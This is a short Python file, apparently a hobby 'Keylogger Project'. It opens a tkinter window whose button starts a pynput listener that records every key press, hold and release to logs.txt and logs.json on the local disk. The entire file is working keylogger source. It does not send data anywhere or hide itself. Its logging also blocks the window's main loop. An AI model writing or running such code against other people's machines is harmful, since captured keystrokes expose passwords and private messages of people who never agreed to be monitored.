import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("300x200")
root.title("Keylogger Project")
key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w+') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
        update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
        update_json_file(key_list)

    key_strokes += str(key)
    update_txt_file(key_strokes)

def start_keylogger():
    global key_strokes
    info_label.config(text="[+] Running keylogger successfully!\n[!] Saving the key logs in 'logs.json'")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Interface
title_label = Label(root, text="Keylogger", font=("Arial", 16, "bold"))
title_label.pack(pady=20)

info_label = Label(root, text="Click the button to start the keylogger", font=("Arial", 10))
info_label.pack(pady=10)

button = Button(root, text="Start Keylogger", command=start_keylogger, font=("Arial", 12, "bold"))
button.pack(pady=20)

root.mainloop()
